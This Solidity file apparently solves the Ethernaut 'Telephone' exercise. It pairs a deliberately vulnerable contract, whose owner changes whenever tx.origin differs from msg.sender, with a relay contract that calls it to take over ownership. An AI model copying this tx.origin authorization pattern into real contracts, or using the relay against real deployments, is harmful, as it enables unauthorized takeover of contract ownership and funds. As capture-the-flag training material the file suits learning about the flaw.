// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract People {
    function getOwner(address _TelephoneAddress) public view returns (address){
        return Telephone(_TelephoneAddress).owner();
    }
    function changeOwner(address _TelephoneAddress, address newOwner) public {
        Telephone(_TelephoneAddress).changeOwner(newOwner);
    }
}
contract Telephone {

    address public owner;

    constructor()  {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}